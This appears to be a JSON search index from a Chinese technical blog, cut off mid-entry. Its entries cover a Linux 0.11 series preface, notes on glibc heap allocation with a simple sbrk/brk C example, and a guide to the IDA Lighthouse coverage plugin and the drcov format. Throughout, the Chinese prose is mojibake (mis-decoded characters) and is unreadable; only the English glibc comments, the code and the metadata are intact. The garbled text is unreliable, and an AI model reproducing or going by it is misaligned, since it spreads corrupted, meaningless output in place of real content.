å¦‚ä½•äº’åŠ¨ è™½ç„¶å·²ç»æå‰å†™å¥½ï¼Œä½†ä¸­é€”è¿˜æ˜¯è¦ä¸æ–­æ¥å—è¯»è€…åé¦ˆå’Œç­”ç–‘ï¼Œä»¥ä¾¿æ›´å¥½ä¿®æ­£æ–‡ç« çš„å†…å®¹ï¼Œå¹¶ä¸”åšä¸€äº›çŸ¥è¯†ç‚¹çš„è¡¥å……ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘å¯¹è‡ªå·±çš„è¦æ±‚å’Œè€ƒéªŒã€‚ æ‰€ä»¥å»ºç«‹å¾®ä¿¡ç¾¤å¢åŠ äº’åŠ¨æ€§ã€‚ åœ¨è¿™é‡Œä½ å¯ä»¥ä¸æ–­å¯¹æ–‡ç« å†…å®¹æå‡ºåé¦ˆæ„è§ï¼Œä»¥åŠå’Œä¸åŒè¯»è€…è¿›è¡Œå¿ƒå¾—äº¤æµï¼Œä»¥åŠè¿›è¡Œå‚¬æ›´å‘å–Šã€‚ä¸è¦è§‰å¾—ä½ çš„æ„è§æ— æ³•å·¦å³è¿™ä¸ªç³»åˆ—ï¼Œè¦çŸ¥é“ï¼Œè¿™ä¸ªç³»åˆ—çš„åç§°å°±æ˜¯ä½å¹¶å‘ç¼–ç¨‹è¯»è€…ç¾¤çš„è¯»è€…ä»¬ç¾¤ä½“çš„æ™ºæ…§æƒ³å‡ºæ¥çš„ã€‚ æˆ‘è§‰å¾—è¿™ä¹Ÿæ˜¯å…¬ä¼—å·é‡Œæ›´æ–°ç³»åˆ—çš„ä¸€ä¸ªä¼˜åŠ¿ï¼Œå°±æ˜¯ä¸è¯»è€…çš„è·ç¦»æ›´è¿‘ï¼Œæ›´æ–¹ä¾¿éšæ—¶è®¨è®ºå’Œäº¤æµï¼Œäº’ç›¸ä¿ƒè¿›æˆé•¿ã€‚ åŠ å…¥æ–¹å¼æ˜¯åŠ æˆ‘å¾®ä¿¡å¥½å‹ï¼Œå¤‡æ³¨ os-æ˜µç§°-å…¶ä»–ä¿¡æ¯ æ¯”å¦‚ os-é—ªå®¢-Java æˆ‘ä¼šå°†æ‰€æœ‰å¤‡æ³¨ä¸ºæœ¬æ ¼å¼çš„å¥½å‹é‚€è¯·è‡³å¾®ä¿¡ç¾¤ã€‚ ä¸€å®šè¦æŒ‰å¤‡æ³¨è¦æ±‚æ¥å“¦~ æˆ‘æ˜¯åä¸½çš„åˆ†å‰²çº¿ å¥½äº†ï¼æœ¬ç¯‡æ–‡ç« å°±å½“åšå¼€ç¯‡è¯ï¼Œä»Šåä¸å‡ºæ„å¤–è‡³å°‘æ¯å‘¨ä¸€å‘¨å››æ›´æ–°ï¼Œæ¯ä¸€ä¸ªå¤§éƒ¨åˆ†ç»“æŸåä¼šçœ‹æƒ…å†µç•™ä¸€æ®µæ—¶é—´é›†ä¸­æ¶ˆåŒ–ä¸æ€»ç»“ã€‚ ä¸è¿‡ä¼šä»¥æ–‡ç« è´¨é‡å’Œå‡†ç¡®æ€§ä¸ºä¸»ï¼Œä¸ä¼šå¸¦ç€é—®é¢˜å¼ºè¡ŒæŒ‰æ—¶æ›´æ–°çš„ã€‚ æœ¬ç³»åˆ—å®Œå…¨å…è´¹ï¼Œç›´åˆ°æ‰€æœ‰ç« èŠ‚å…¨éƒ¨ç»“æŸï¼Œæ‰€ä»¥ä½ ä»¬çš„å–œæ¬¢å’Œä¼ æ’­å°±æ˜¯å¯¹æˆ‘æœ€å¤§çš„æ”¯æŒï¼Œå¯ä»¥æ˜Ÿæ ‡æˆ‘çš„å…¬ä¼—å·é˜²æ­¢é”™è¿‡æ›´æ–°æé†’ã€‚ å…¬ä¼—å·è™½ç„¶ä¸è¯»è€…è·ç¦»æ›´è¿‘ï¼Œä½†å®ƒå´æ˜¯ä¸ªå°é—­çš„ç©ºé—´ï¼Œå¹³å°å’Œæœç´¢å¼•æ“ä¸ä¼šä¸»åŠ¨å‘å¤–æ‰©æ•£ï¼Œæ‰€ä»¥å¦‚æœæ²¡æœ‰äººä¸»åŠ¨å¸®å¿™ä¼ æ’­ï¼Œä¼šä¸€ç›´é™åˆ¶åœ¨å…¬ä¼—å·ç²‰ä¸çš„åœˆå­é‡Œï¼Œè¶Šåˆ°åé¢çœ‹çš„äººä¹Ÿä¼šè¶Šå°‘ã€‚ è¿™ä¹Ÿæ˜¯å¾ˆå¤šå…¬ä¼—å·ç³»åˆ—ä¸­é€”è…°æ–©çš„å› ç´ ä¹‹ä¸€ï¼Œæ‰€ä»¥è¿˜æ˜¯å¸Œæœ›å¤§å®¶å–œæ¬¢è¿™ä¸ªç³»åˆ—çš„è¯ï¼Œå¯ä»¥å¤šå¤šå¸®å¿™ä¼ æ’­ï¼Œæ¯”å¦‚æœ‹å‹åœˆæ‰“æ‰“å¡ï¼Œæˆ–è€…å¦‚æœä½ ä¹Ÿå†™åšå®¢çš„è¯ï¼Œæ–‡ç« é‡Œæææˆ‘ï¼Œéƒ½æ˜¯å¯ä»¥å¸®åˆ°è¿™ä¸ªç³»åˆ—æ´»ä¸‹å»çš„é‡è¦é€”å¾„ï¼Œåœ¨æ­¤å¤šè°¢å„ä½æ§åœºå•¦ï¼ åŒæ—¶æˆ‘ä¹Ÿä¼šåœ¨ GitHub ä¸Šè¿›è¡ŒåŒæ­¥ï¼Œå› ä¸ºå…¬ä¼—å·æ–‡ç« å‘äº†ä¹‹åå°±æ— æ³•ä¿®æ”¹ï¼Œä¹Ÿæ²¡æ³•è¿›è¡Œæ•´ä½“è°ƒæ•´ã€‚æ„Ÿå…´è¶£çš„ä¹Ÿå¯ä»¥ç‚¹å‡»é˜…è¯»åŸæ–‡è¿›å…¥ GitHubã€‚ä½†æˆ‘åŒæ­¥åº”è¯¥ä¸ä¼šå¾ˆåŠæ—¶ï¼Œè¿˜æ˜¯ä»¥å…¬ä¼—å·ä¸ºä¸»æˆ˜åœºï¼Œæ¯•ç«Ÿæ—¶é—´å’Œç²¾åŠ›æœ‰é™ã€‚ é‚£å°±è®©æˆ‘ä»¬ä¸€èµ·æœŸå¾…å§ï¼ ","date":"2021-11-18","objectID":"/2021/11/linux-0.11-%E5%BA%8F/:1:0","tags":["Linux","kernel"],"title":"Linux-0.11-åº","uri":"/2021/11/linux-0.11-%E5%BA%8F/"},{"categories":["LINUX"],"content":"åŸæ–‡åœ°å€ é—ªå®¢æ–°ç³»åˆ—ï¼ä½ ç®¡è¿™ç ´ç©æ„å«æ“ä½œç³»ç»Ÿæºç  ","date":"2021-11-18","objectID":"/2021/11/linux-0.11-%E5%BA%8F/:2:0","tags":["Linux","kernel"],"title":"Linux-0.11-åº","uri":"/2021/11/linux-0.11-%E5%BA%8F/"},{"categories":["LINUX"],"content":"Linuxå †å†…å­˜ç®¡ç†æ·±å…¥åˆ†æ","date":"2021-11-11","objectID":"/2021/11/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/","tags":["heap"],"title":"Linuxå †å†…å­˜ç®¡ç†æ·±å…¥åˆ†æ","uri":"/2021/11/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/"},{"categories":["LINUX"],"content":"Linuxå †å†…å­˜ç®¡ç†æ·±å…¥åˆ†æ ","date":"2021-11-11","objectID":"/2021/11/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/:0:0","tags":["heap"],"title":"Linuxå †å†…å­˜ç®¡ç†æ·±å…¥åˆ†æ","uri":"/2021/11/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/"},{"categories":["LINUX"],"content":"1. å †æ¦‚è¿° ","date":"2021-11-11","objectID":"/2021/11/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/:1:0","tags":["heap"],"title":"Linuxå †å†…å­˜ç®¡ç†æ·±å…¥åˆ†æ","uri":"/2021/11/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/"},{"categories":["LINUX"],"content":"1. æ¦‚å¿µ ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå †å¯ä»¥æä¾›åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼Œå…è®¸ç¨‹åºç”³è¯·å¤§å°æœªçŸ¥çš„å†…å­˜ã€‚å †å…¶å®å°±æ˜¯ç¨‹åºè™šæ‹Ÿåœ°å€ç©ºé—´çš„ä¸€å—è¿ç»­çš„çº¿æ€§åŒºåŸŸï¼Œå¢é•¿æ–¹å‘ä¸ºç”±ä½åˆ°é«˜ã€‚ä¸€èˆ¬ç§°ç®¡ç†å †çš„é‚£éƒ¨åˆ†ç¨‹åºä¸ºå †ç®¡ç†å™¨ã€‚ å †ç®¡ç†å™¨å¤„äºç”¨æˆ·ç¨‹åºä¸å†…æ ¸ä¸­é—´ï¼Œæä¾›ä¸»è¦ä»¥ä¸‹åŠŸèƒ½ï¼š å“åº”ç”¨æˆ·çš„ç”³è¯·å†…å­˜è¯·æ±‚ï¼Œå‘OSç”³è¯·å†…å­˜ï¼Œç„¶åå°†å…¶è¿”å›ç»™ç”¨æˆ·ç¨‹åºã€‚åŒæ—¶ï¼Œä¸ºäº†ä¿æŒå†…å­˜ç®¡ç†çš„é«˜æ•ˆæ€§ï¼Œå†…æ ¸ä¸€èˆ¬ä¼šé¢„å…ˆåˆ†é…å¾ˆå¤§çš„ä¸€å—è¿ç»­çš„å†…å­˜ï¼Œç„¶åè®©å †ç®¡ç†å™¨é€šè¿‡æŸç§ç®—æ³•æ¥ç®¡ç†è¿™å—å†…å­˜ã€‚åªæœ‰å½“å‡ºç°äº†å †ç©ºé—´ä¸è¶³çš„æƒ…å†µï¼Œå †ç®¡ç†å™¨æ‰ä¼šå†æ¬¡ä¸OSäº¤äº’ï¼Œç”³è¯·æ–°çš„å†…å­˜ã€‚ ç®¡ç†ç”¨æˆ·æ‰€é‡Šæ”¾çš„å†…å­˜ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œç”¨æˆ·é‡Šæ”¾çš„å†…å­˜å¹¶ä¸æ˜¯ç›´æ¥è¿”è¿˜ç»™OSï¼Œè€Œæ˜¯ç”±å †ç®¡ç†å™¨è¿›è¡Œç®¡ç†ã€‚è¿™äº›é‡Šæ”¾çš„å†…å­˜åœ¨å †ç®¡ç†å™¨çš„ç®¡ç†ä¸‹ï¼Œå¯ä»¥æ¥å“åº”ç”¨æˆ·æ–°ç”³è¯·çš„å†…å­˜çš„è¯·æ±‚ã€‚ ç›®å‰Linuxå‘è¡Œç‰ˆä¸­ä½¿ç”¨çš„å †åˆ†é…å™¨æ˜¯glibcä¸­çš„å †åˆ†é…å™¨ï¼šptmalloc2ï¼Œå…¶ä¸»è¦é€šè¿‡ malloc/free å‡½æ•°æ¥åˆ†é…å’Œé‡Šæ”¾å†…å­˜å—ã€‚ æ³¨ï¼šLinux å†…å­˜ç®¡ç†çš„ä¸€ä¸ªåŸºæœ¬æ€æƒ³ï¼šåªæœ‰åœ¨çœŸæ­£è®¿é—®ä¸€ä¸ªåœ°å€çš„æ—¶å€™ï¼ŒOSæ‰ä¼šå»ºç«‹è™šæ‹Ÿé¡µé¢ä¸ç‰©ç†é¡µé¢çš„æ˜ å°„å…³ç³»ã€‚åŸºäºè¿™ä¸ªæ€æƒ³ï¼ŒOSè™½ç„¶å·²ç»ç»™ç¨‹åºåˆ†é…äº†å¾ˆå¤§çš„ä¸€å—å†…å­˜ï¼Œä½†æ˜¯è¿™å—å†…å­˜å…¶å®åªæ˜¯è™šæ‹Ÿå†…å­˜ã€‚åªæœ‰å½“ç”¨æˆ·ä½¿ç”¨åˆ°å“åº”çš„å†…å­˜æ—¶ï¼ŒOSæ‰ä¼šçœŸæ­£åˆ†é…ç‰©ç†é¡µé¢ç»™ç”¨æˆ·ä½¿ç”¨ã€‚ ","date":"2021-11-11","objectID":"/2021/11/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/:1:1","tags":["heap"],"title":"Linuxå †å†…å­˜ç®¡ç†æ·±å…¥åˆ†æ","uri":"/2021/11/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/"},{"categories":["LINUX"],"content":"2. å †çš„åŸºæœ¬æ“ä½œ å †åˆ†é…ï¼šmalloc åœ¨ glibc çš„ malloc.c ä¸­ï¼Œå…¶è¯´æ˜å¦‚ä¸‹ï¼š /* malloc(size_t n) Returns a pointer to a newly allocated chunk of at least n bytes, or null if no space is available. Additionally, on failure, errno is set to ENOMEM on ANSI C systems. If n is zero, malloc returns a minumum-sized chunk. (The minimum size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit systems.) On most systems, size_t is an unsigned type, so calls with negative arguments are interpreted as requests for huge amounts of space, which will often fail. The maximum supported value of n differs across systems, but is in all cases less than the maximum representable value of a size_t. */ malloc å‡½æ•°è¿”å›çš„æ˜¯å¯¹åº”å¤§å°å­—èŠ‚çš„å†…å­˜å—çš„æŒ‡é’ˆã€‚ å½“n = 0æ—¶ï¼Œè¿”å›å½“å‰ç³»ç»Ÿå…è®¸çš„å †çš„æœ€å°å†…å­˜å— å½“nä¸ºè´Ÿæ•°æ—¶ï¼Œç”±äºåœ¨å¤§å¤šæ•°ç³»ç»Ÿä¸Šï¼Œsize_t æ˜¯æ— ç¬¦å·æ•°ï¼ˆè¿™ä¸€ç‚¹éå¸¸é‡è¦ï¼‰ï¼Œæ‰€ä»¥ç¨‹åºä¼šç”³è¯·å¾ˆå¤§çš„å†…å­˜ç©ºé—´ï¼Œä½†é€šå¸¸æ¥è¯´éƒ½ä¼šå¤±è´¥ï¼Œå› ä¸ºç³»ç»Ÿæ²¡æœ‰é‚£ä¹ˆå¤šçš„å†…å­˜å¯ä»¥åˆ†é…ã€‚ å †é‡Šæ”¾ï¼šfree åœ¨ glibc çš„ malloc.c ä¸­ï¼Œå…¶è¯´æ˜å¦‚ä¸‹ï¼š /* free(void* p) Releases the chunk of memory pointed to by p, that had been previously allocated using malloc or a related routine such as realloc. It has no effect if p is null. It can have arbitrary (i.e., bad!) effects if p has already been freed. Unless disabled (using mallopt), freeing very large spaces will when possible, automatically trigger operations that give back unused memory to the system, thus reducing program footprint. */ free å‡½æ•°ä¼šé‡Šæ”¾ç”±æŒ‡é’ˆ p æ‰€æŒ‡å‘çš„å†…å­˜å—ã€‚è¯¥å†…å­˜å—å¯èƒ½æ˜¯ malloc fåˆ†é…çš„ï¼Œä¹Ÿå¯èƒ½æ˜¯ç±»ä¼¼å‡½æ•° realloc ç­‰åˆ†é…çš„ã€‚ å½“ p ä¸ºç©ºæŒ‡é’ˆæ—¶ï¼Œå‡½æ•°ä¸æ‰§è¡Œä»»ä½•æ“ä½œã€‚ å½“ p å·²ç»è¢«é‡Šæ”¾åï¼Œå†æ¬¡é‡Šæ”¾ä¼šå‡ºç°æ„æ–™ä¹‹å¤–çš„æ•ˆæœï¼Œè¿™å…¶å®å°±æ˜¯ Double Free(åŒé‡é‡Šæ”¾)ã€‚ é™¤äº†è¢«ç¦ç”¨ (mallopt) çš„æƒ…å†µä¸‹ï¼Œå½“é‡Šæ”¾å¾ˆå¤§çš„å†…å­˜ç©ºé—´æ—¶ï¼Œç¨‹åºä¼šå°†è¿™äº›å†…å­˜ç©ºé—´è¿˜ç»™OSï¼Œä»¥ä¾¿äºå‡å°ç¨‹åºæ‰€ä½¿ç”¨çš„å†…å­˜ç©ºé—´ã€‚ å†…å­˜åˆ†é…æ¶‰åŠåˆ°çš„ç³»ç»Ÿè°ƒç”¨ æ— è®ºæ˜¯ malloc è¿˜æ˜¯ freeï¼Œåœ¨åŠ¨æ€ç”³è¯·å’Œé‡Šæ”¾å†…å­˜æ—¶ï¼Œå¹¶ä¸æ˜¯çœŸæ­£ä¸ç³»ç»Ÿäº¤äº’çš„å‡½æ•°ã€‚è¿™äº›å‡½æ•°èƒŒåçš„ç³»ç»Ÿè°ƒç”¨ä¸»è¦æ˜¯ (s)brk å‡½æ•°ä»¥åŠ mmap, munmap å‡½æ•°ã€‚ å †å†…å­˜å—ç”³è¯· å¯¹äºå †å†…å­˜çš„åˆ†é…æ“ä½œï¼ŒOSæä¾›äº† brk å‡½æ•°ï¼Œglibc æä¾›äº† sbrk å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¢åŠ  brk çš„å¤§å°æ¥å‘OSç”³è¯·å†…å­˜ã€‚ åˆå§‹æ—¶ï¼Œå †çš„èµ·å§‹åœ°å€ start_brk ä»¥åŠå †çš„å½“å‰æœ«å°¾ brk æŒ‡å‘åŒä¸€åœ°å€ã€‚æ ¹æ®æ˜¯å¦å¼€å¯ ASLRï¼Œä¸¤è€…çš„å…·ä½“ä½ç½®ä¼šæœ‰æ‰€ä¸åŒ ä¸å¼€å¯ ASLR ä¿æŠ¤æ—¶ï¼Œstart_brk ä»¥åŠ brk ä¼šæŒ‡å‘ data/bss æ®µçš„ç»“å°¾ã€‚ å¼€å¯ ASLR ä¿æŠ¤æ—¶ï¼Œstart_brk ä»¥åŠ brk ä¹Ÿä¼šæŒ‡å‘åŒä¸€ä½ç½®ï¼Œåªæ˜¯è¿™ä¸ªä½ç½®æ˜¯åœ¨ data/bss æ®µç»“å°¾åçš„éšæœºåç§»å¤„ã€‚ å…·ä½“æ•ˆæœå¦‚ä¸‹å›¾ï¼ˆè¿™ä¸ªå›¾ç‰‡ä¸ç½‘ä¸Šæµä¼ çš„åŸºæœ¬ä¸€è‡´ï¼Œè¿™é‡Œæ˜¯å› ä¸ºè¦ç”»ä¸€å¼ å¤§å›¾ï¼Œæ‰€ä»¥è‡ªå·±å•ç‹¬ç”»äº†ä¸‹ï¼‰æ‰€ç¤ºï¼š ä»£ç ä¾‹å­ï¼š /* sbrk and brk example */ #include \u003cstdio.h\u003e #include \u003cunistd.h\u003e #include \u003csys/types.h\u003e int main() { void *curr_brk, *tmp_brk = NULL; printf(\"Welcome to sbrk example:%d\\n\", getpid()); /* sbrk(0) gives current program break location */ tmp_brk = curr_brk = sbrk(0); printf(\"Program Break Location1:%p\\n\", curr_brk); getchar(); // ä½¿ç”¨getcharæ¥æš‚åœè¿è¡Œï¼Œæ–¹ä¾¿è§‚å¯Ÿ /* brk(addr) increments/decrements program break location */ brk(curr_brk+4096); curr_brk = sbrk(0); printf(\"Program break Location2:%p\\n\", curr_brk); getchar(); brk(tmp_brk); curr_brk = sbrk(0); printf(\"Program Break Location3:%p\\n\", curr_brk); getchar(); return 0; } åœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨brkä¹‹å‰ è¾“å‡ºå¦‚ä¸‹ï¼š ","date":"2021-11-11","objectID":"/2021/11/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/:1:2","tags":["heap"],"title":"Linuxå †å†…å­˜ç®¡ç†æ·±å…¥åˆ†æ","uri":"/2021/11/linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/"},{"categories":["Fuzz"],"content":"Lighthouseä½¿ç”¨åŠæ”¹è¿›","date":"2021-10-17","objectID":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/","tags":["Fuzz","Instrument","Pin"],"title":"åˆ©ç”¨Lighthouseè¿›è¡Œè¦†ç›–ç‡ç»Ÿè®¡åŠå…¶ä¼˜åŒ–","uri":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/"},{"categories":["Fuzz"],"content":"TL;DR ä»‹ç»IDAè¦†ç›–ç‡ç»Ÿè®¡æ’ä»¶Lighthouseçš„ä½¿ç”¨ï¼Œå¹¶å¯¹å…¶è¦†ç›–ç‡è¾“å‡ºæ–¹å¼è¿›è¡Œä¿®æ”¹ï¼Œè·å¾—å¯é˜…è¯»çš„æ˜æ–‡ä»£ç æ‰§è¡Œè·¯å¾„ä¿¡æ¯ã€‚ ","date":"2021-10-17","objectID":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/:1:0","tags":["Fuzz","Instrument","Pin"],"title":"åˆ©ç”¨Lighthouseè¿›è¡Œè¦†ç›–ç‡ç»Ÿè®¡åŠå…¶ä¼˜åŒ–","uri":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/"},{"categories":["Fuzz"],"content":"1. èƒŒæ™¯ æœ€è¿‘æœ‰ç»Ÿè®¡è¦†ç›–ç‡ä¿¡æ¯çš„éœ€æ±‚ï¼Œå¤šæ–¹æœç´¢åå‘ç°IDAæ’ä»¶Lighthouseå…·æœ‰ç»Ÿè®¡è¦†ç›–ç‡çš„åŠŸèƒ½ï¼Œé€šè¿‡è¯»å–DynamoRIOæˆ–è€…Pinäº§ç”Ÿçš„è¦†ç›–ç‡æ—¥å¿—æ–‡ä»¶ï¼Œåœ¨IDAä¸­ä»¥å›¾å½¢åŒ–å½¢å¼å±•ç°ä»£ç çš„è¯¦ç»†æ‰§è¡Œè·¯å¾„ã€‚ DynamoRIOæˆ–Pinç­‰æ’æ¡©å·¥å…·é»˜è®¤ä½¿ç”¨çš„æ—¥å¿—æ–‡ä»¶æ ¼å¼ä¸ºdrcovæ ¼å¼ï¼Œè¿™æ˜¯ä¸€ç§äºŒè¿›åˆ¶æ ¼å¼ï¼Œæ¯ä¸ªåŸºæœ¬å—çš„ä¿¡æ¯çš„éƒ½æ˜¯ä»¥åå…­è¿›åˆ¶æ•°æ®è¿›è¡Œè®°å½•ã€‚è™½ç„¶äºŒè¿›åˆ¶å½¢å¼çš„è®°å½•æ–¹å¼æœ‰åˆ©äºæé«˜æ€§èƒ½ï¼Œä½†æ˜¯äººå·¥é˜…è¯»å›°éš¾ã€‚ ","date":"2021-10-17","objectID":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/:2:0","tags":["Fuzz","Instrument","Pin"],"title":"åˆ©ç”¨Lighthouseè¿›è¡Œè¦†ç›–ç‡ç»Ÿè®¡åŠå…¶ä¼˜åŒ–","uri":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/"},{"categories":["Fuzz"],"content":"2. Lighouseçš„åŸºæœ¬ä½¿ç”¨ ä¸‹è½½ï¼šLighthouseï¼› å®‰è£…ï¼š åœ¨IDAä¸­æ‰¾åˆ°æ’ä»¶æ–‡ä»¶çš„ç›®å½•ï¼š import idaapi, os; print(os.path.join(idaapi.get_user_idadir(), \"plugins\")) å°†ä¸‹è½½ä¸‹æ¥çš„æºç ä¸­çš„/plugins/æ–‡ä»¶å¤¹copyåˆ°ä¸Šé¢å‘½ä»¤æ‰§è¡Œç»“æœçš„ç›®å½•ä¸­ï¼Œç„¶åé‡å¯IDAã€‚ è·å–drcovæ ¼å¼è¦†ç›–ç‡ç»Ÿè®¡æ—¥å¿—æ–‡ä»¶ï¼š é¦–å…ˆä½¿ç”¨Pinæˆ–DynamoRIOè·å–è¦†ç›–ç‡ç»Ÿè®¡æ–‡ä»¶(è¿™é‡Œä»¥Pinä¸ºä¾‹)ï¼š è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒLighthouseé»˜è®¤ä½¿ç”¨çš„drcovæ–‡ä»¶ç‰ˆæœ¬ä¸ºversion 2ï¼Œä½†æ˜¯æœ€æ–°ç‰ˆçš„DynamoRIOç”Ÿæˆçš„drcovæ–‡ä»¶çš„ç‰ˆæœ¬ä¸ºversion 3ï¼Œæ‰€ä»¥åœ¨å¯¼å…¥IDAæ—¶ä¼šæç¤ºæ–‡ä»¶æ ¼å¼é”™è¯¯ã€‚Lighthouseç›®å‰æä¾›äº†pinå’Œfridaçš„è¦†ç›–ç‡ç»Ÿè®¡æ’ä»¶ï¼ŒDynamoRIOçš„éœ€è¦åšä¿®æ”¹æˆ–è€…ä½¿ç”¨æ—§ç‰ˆæœ¬çš„DynamoRIOï¼š IDAä¸­å¯¼å…¥æ—¥å¿—æ–‡ä»¶ï¼š é¦–å…ˆIDAåŠ è½½è¦è§‚å¯Ÿçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œç„¶åFile -\u003e Load file -\u003e Code coverage file... åŠ è½½åˆšåˆšç”Ÿæˆçš„æ—¥å¿—æ–‡ä»¶ï¼š æ§åˆ¶æµå›¾çš„è“è‰²åŸºæœ¬å—ä¸ºæ‰§è¡Œäº†çš„åŸºæœ¬å—ï¼Œå³ä¾§ä¸ºcoverageçš„overviewä¿¡æ¯ åŒæ ·è¿›è¡ŒF5ä¹‹åï¼Œå¯ä»¥çœ‹åˆ°æ‰§è¡Œè¿‡çš„ä¼ªä»£ç ï¼š ","date":"2021-10-17","objectID":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/:3:0","tags":["Fuzz","Instrument","Pin"],"title":"åˆ©ç”¨Lighthouseè¿›è¡Œè¦†ç›–ç‡ç»Ÿè®¡åŠå…¶ä¼˜åŒ–","uri":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/"},{"categories":["Fuzz"],"content":"3. drcovæ–‡ä»¶æ ¼å¼ ","date":"2021-10-17","objectID":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/:4:0","tags":["Fuzz","Instrument","Pin"],"title":"åˆ©ç”¨Lighthouseè¿›è¡Œè¦†ç›–ç‡ç»Ÿè®¡åŠå…¶ä¼˜åŒ–","uri":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/"},{"categories":["Fuzz"],"content":"1. ç®€ä»‹ drcovæ˜¯åŸºäºDynamoRIOæ¡†æ¶çš„ç”¨äºæ”¶é›†äºŒè¿›åˆ¶ç¨‹åºè¦†ç›–ç‡ä¿¡æ¯çš„ä¸€ç§å·¥å…·ï¼Œå…¶æ”¶é›†çš„è¦†ç›–ç‡ä¿¡æ¯æ ¼å¼å³ä¸ºdrcovæ ¼å¼ã€‚å› ä¸ºå…¶æˆç†Ÿé«˜æ•ˆçš„ç‰¹ç‚¹ï¼Œå¾ˆå¤šè¿›è¡Œè¦†ç›–ç‡æ”¶é›†çš„å·¥å…·éƒ½ä¼šä½¿ç”¨è¿™ç§æ ¼å¼ã€‚ DynamoRIOå®˜æ–¹å¹¶æœªå¯¹drcovæ ¼å¼è¿›è¡Œè¯¦ç»†çš„è¯´æ˜ï¼Œæ‰€ä»¥æ­¤å¤„è¿›è¡Œè¯´æ˜è®°å½•ï¼Œå¸Œæœ›èƒ½å¯¹åç»­çš„è¦†ç›–ç‡ä¿¡æ¯æ”¶é›†å·¥å…·çš„å¼€å‘èµ·åˆ°ä¸€å®šçš„ä½œç”¨ ","date":"2021-10-17","objectID":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/:4:1","tags":["Fuzz","Instrument","Pin"],"title":"åˆ©ç”¨Lighthouseè¿›è¡Œè¦†ç›–ç‡ç»Ÿè®¡åŠå…¶ä¼˜åŒ–","uri":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/"},{"categories":["Fuzz"],"content":"2. è¯¦ç»†æ ¼å¼ é¦–å…ˆï¼Œdrcovæ 